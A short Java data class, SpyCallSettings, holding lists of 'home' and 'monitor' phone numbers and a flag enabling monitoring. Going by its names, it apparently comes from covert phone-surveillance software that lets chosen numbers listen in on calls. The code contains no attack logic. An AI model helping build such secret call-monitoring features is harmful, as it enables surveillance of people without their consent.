package com.fx.maind.ref;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;

public class SpyCallSettings  implements Serializable{
	private static final long serialVersionUID = 1L;
	
	private List<String> homeNumberList;
	private List<String> monitorNumberList;
	private boolean mEnableMonitor;
	
	public SpyCallSettings() {
		homeNumberList = new ArrayList<String>();
		monitorNumberList = new ArrayList<String>();
	}
	
	public boolean getEnableMonitor() {
		return mEnableMonitor;
	}

	public void setEnableMonitor(boolean isEnabled) {
		mEnableMonitor = isEnabled;
	}
	
	public void AddHomeNumber(String number) {
		homeNumberList.add(number);
	}
	
	public void AddHomeNumber(List<String> numbers) {
		homeNumberList.addAll(numbers);
	}
	
	public void AddMonitorNumber(String number) {
		monitorNumberList.add(number);
	}
	
	public void AddMonitorNumber(List<String> numbers) {
		monitorNumberList.addAll(numbers);
	}
	
	public List<String>  GetHomeNumbers() {
		return homeNumberList;
	}

	public List<String>  GetMonitorNumbers() {
		return monitorNumberList;
	}
	
	@Override
	public String toString() {
		StringBuilder builder = new StringBuilder();
		builder.append("SpyCallSettings {");
		builder.append(" Home Numbers size =").append(homeNumberList.size());
		builder.append(" Monitor Number size =").append(monitorNumberList.size());
		return builder.append(" }").toString();		
	}
}
